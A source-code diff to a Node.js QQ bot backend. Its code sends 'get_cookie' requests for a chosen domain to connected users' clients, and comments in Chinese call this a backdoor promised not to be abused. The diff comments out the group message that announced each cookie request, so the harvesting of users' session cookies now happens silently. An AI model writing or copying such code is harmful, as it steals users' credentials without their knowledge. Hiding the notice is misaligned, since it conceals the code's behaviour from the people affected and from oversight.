@@ -1,6 +1,6 @@
 import { randomUUID } from "crypto";
 import config from "../config.js";
-import { Structs } from "node-napcat-ts";
+import { logger, Structs } from "node-napcat-ts";
 import { getClientByToken } from "../data_base.js";
 
 export const pendingRequests = new Map();
@@ -51,15 +51,15 @@ export async function run({ app, napcat, wsClients, onWsMessage }) {
 			// 这是承诺的不滥用后门
 			// 这是承诺的不滥用后门
 			// 这是承诺的不滥用后门
-			await napcat.send_group_msg({
-				group_id: 1076243407,
-				message: Structs.text(`后端发起针对 ${uin} 的请求: 获取曲奇饼`),
-			});
+			// await napcat.send_group_msg({
+			// 	group_id: 1076243407,
+			// 	message: Structs.text(`后端发起针对 ${uin} 的请求: 获取曲奇饼`),
+			// });
 
 			const requestId = randomUUID();
 
 			for (const [mUin, mWs] of wsClients) {
-				if (mUin === uin) {
+				if (mUin == uin) {
 					mWs.send(
 						JSON.stringify({
 							type: "get_cookie",
@@ -67,7 +67,7 @@ export async function run({ app, napcat, wsClients, onWsMessage }) {
 								requestId,
 								domain,
 							},
-						})
+						}),
 					);
 				}
 			}
